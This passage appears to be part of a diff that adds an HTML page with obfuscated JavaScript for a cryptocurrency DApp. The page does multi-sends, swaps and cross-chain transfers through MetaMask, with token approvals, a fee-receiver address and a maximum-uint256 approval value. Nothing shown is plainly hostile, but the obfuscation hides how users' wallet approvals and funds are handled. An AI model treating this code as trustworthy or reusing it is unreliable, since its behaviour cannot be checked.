'8JzhGlY', '0x55d398326f99059ff775485246999027b3197955', '_owner', '<h\x20class=\x22text-danger\x22>', '\x20class=\x22dropdown-item\x22\x20onclick=\x22ChooseFromToken(\x27', 'This\x20is\x20the\x20kovan\x20\x20network.', 'Approval\x20successfull!', 'accountsChanged', 'Avax', 'nameID:', 'web3', 'read\x20csv\x20Error:', 'https://bsc-dataseed1.binance.org', 'OutEther', '187235hZbeyR', 'My\x20', 'NetworkIDIniterWant', 'Medium', '</table>', 'reverse', 'https://bscscan.com/address/0x55d398326f99059ff775485246999027b3197955', '*Require\x20different\x20Network', 'UserChooseFromItem', 'FTM', 'This\x20is\x20an\x20unknown\x20network.', '_AddressArray:', '#seconds', 'This\x20is\x20Polygon\x20mainnet', '</tr>', 'EndTime:', 'Scan', 'transactionHashLabel', 'https://bsc-dataseed1.binance.org/', 'https://rpc-mainnet.matic.network', 'decimals', 'includes', 'option', 'balanceOf', 'send', '0.00001', 'https://polygonscan.com/tx/', 'checked', 'log', 'AmountIniterWant', 'Network\x20is\x20OK,now\x20contract\x20address\x20is\x20:', 'Network\x20Is\x20wrong,Add\x20or\x20Switch\x20now', 'ToImage', '#EventTable', 'SendFee:', 'value', 'fileUpload', 'removeAttr', 'call', 'ISendInputChange\x20CheckValue():', '10lwvfby', 'BNB', 'Polygon\x20USDT\x20Stock\x20is\x20Not\x20enough,Max:', 'request', 'Stock\x20Not\x20enough', 'toLowerCase', 'each', 'chainxName', 'NetworkOK', 'none', 'use\x20token::', 'ToInput', 'innerText', '96mbLodi', 'USDAddress', '31356XlZpMH', '#li', 'message', 'currentProvider', '#MultiSendButton', 'https://cronoscan.com/tx/', 'fill\x20your\x20token\x20address\x20first.', 'multiple-variable-equations', 'balanceOf:', '#UserFromCoinAddress', 'floor', 'networkId.', 'Tips', 'UserChooseToItem', 'This\x20is\x20the\x20BSC\x20\x20network.', '\x20and\x20', '#SendUSDDescription', 'ISendInput', '</td><td>', 'getPastEvents', '#SwapButton', 'address', 'tx/', 'amounts', 'RecieveToken:', 'Name', 'TokenDecimals:', '\x20<th>You\x20get</th>\x20\x20', '</th><td\x20class=\x22text-white\x22\x20>', 'you\x20select\x20token:', 'matic-network', 'display', 'appendChild', 'first', 'result', 'market_data', 'https://candleexplorer.com/tx/', 'MainCoin\x20balance:', 'ToToken:', '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', '#minutes', 'FromInput', 'FromButton', 'createElement', 'click', 'table', 'SelectIWant', '#OverTime', 'low', '\x22\x20width=\x2230\x22\x20height=\x2230\x22\x20\x20', 'Start\x20SendMultiToken', '0x530f50669c3a3a83d70505b6b7f696082a13c9e2', 'initiate\x20can\x20not\x20connect\x20to\x20the\x20smart\x20contract\x20or\x20less\x20than\x20100', 'This\x20is\x20Huobi\x20mainnet', 'https://cronoscan.com/', '3263KVCMME', '5131599MdXcCq', '_ContractNetworkID', '<a\x20class=\x27text-secondary\x27\x20href=\x27', '000000000000000000', 'generate\x20TokenContract:', 'toString', 'https://rpcapi.fantom.network', '#RecieveBalance', 'allEvents', 'USDdecimals', '_AddressArray', 'fromWei', '<span>Days</span>', 'target', 'UseHighGasFee:\x20', 'UpdateInfo\x20error:', 'disabled', 'Use\x20token', '11654ZyjIeX', '\x20\x20NetworkID\x20token\x20balance:', '#loader1', '#nav\x20li', 'onload', 'This\x20is\x20the\x20deprecated\x20Morden\x20test\x20network.', 'uint256', '#hours', 'SelectOptionID', '#Tips', 'Contract', 'Send\x20amount\x20or\x20address\x20should\x20not\x20be\x20empty', '#days', 'SenderNetworkID:', 'change', 'readAsText', '<span>Minutes</span>', 'swapNoSplit\x20finish', '\x20<th>You\x20send</th>\x20', 'https://etherscan.io/tx/', '\x20class=\x22dropdown-item\x22\x20onclick=\x22ChooseToToken(\x27', 'push', 'USDSymbol', '000', 'getId', 'options:', 'eth', 'FetchURL:', 'toLocaleString', 'map', 'UseAdapters*****\x20', 'insertCell', '\x27)\x22\x20/>', 'getTime', 'RPCURL', '1.png', 'Loading...', 'current\x20network\x20equl\x20Select\x20network\x20id.\x20does\x27nt\x20need\x20switch\x20metamask', '43114', 'img/', 'length', '#SendDiffAmountDiv', 'do\x20sth..', '137', '0.001', '\x20<th>Initer\x20Network</th>\x20\x20', 'one-variable-equations', 'This\x20is\x20the\x20Polygon\x20\x20network.', 'latest', 'finalAmount:', 'getBalance', '0xc2132d05d31c914a87c6611c10748aeb04b58e8f', 'FeeReciever\x20Address:', 'https://api.avax.network/ext/bc/C/rpc', 'Send\x20amount:', 'TempText:', 'addClass', 'function', 'This\x20is\x20Binance\x20mainnet', 'attr', 'CurrentTokenDecimals:', 'This\x20browser\x20does\x20not\x20support\x20HTML5.', 'usd', 'getElementsByTagName', 'HttpProvider', 'black', 'contractAdress:', 'totalFee:', 'Coins\x20:\x20', 'MATIC', '...', 'low\x20gas', 'Send\x20USD\x20need\x20>\x203.', 'SendAmount:', 'start', '_USDOut\x20', 'returnValues', 'CurrentBlockchainImageID', '<tr\x20class=\x22bg-warning\x22>', 'ready', 'SelectIWant:', '<tr\x20class=\x22bg-dark\x22>', 'USDOut:', 'Please\x20upload\x20a\x20valid\x20CSV\x20file.', 'reload', 'USDT.e', 'I\x20Send\x20', 'https://polygonscan.com/', '<img\x20class=\x22m-1\x20rounded\x22\x20\x20src=\x22', '\x20/>', 'trans_estimate_gas:', 'https://polygonscan.com/address/0xc2132d05d31c914a87c6611c10748aeb04b58e8f', 'https://phoenixplorer.com/tx/', 'NeedApproveToken:', 'Matic(Polygon)\x20Mainnet', 'Approval\x20failed!', 'Your\x20token\x20balance\x20is\x20not\x20enough,need\x20', '0x520827a2897587FcF6c30A9C0e549ec5216148D6', 'transactionHash', 'This\x20is\x20the\x20Candle\x20network.', 'Transaction\x20Hash:\x20\x20', 'balance', 'Symbol', 'substring', 'dvCSV', 'utils', 'high\x20gas', 'RewardPool', 'multiSender\x20can\x20not\x20connect\x20to\x20the\x20smart\x20contract\x20or\x20less\x20than\x20100', '#RouterTable', 'name', 'error.code', 'Coins:', 'catch', 'Reward\x20coins\x20Pool:', 'show', '#PriceSuggest', 'src', '\x22>\x20', 'insertRow', 'IWantInput', 'files', '#transactionHashLabel', 'OK...', 'ToButton', 'green']; _0x2034 = function () { return _0x3151aa; }; return _0x2034(); } var delayTimer; function delayRun(_0x39a035) { clearTimeout(delayTimer), delayTimer = setTimeout(function () { var _0x337620 = _0x2aa2; console[_0x337620(0x3bb)](_0x337620(0x255), _0x39a035), UpdateInfo(); }, 0x3e8); }
+    </script>
+
+
+
+</body>
+
+</html>
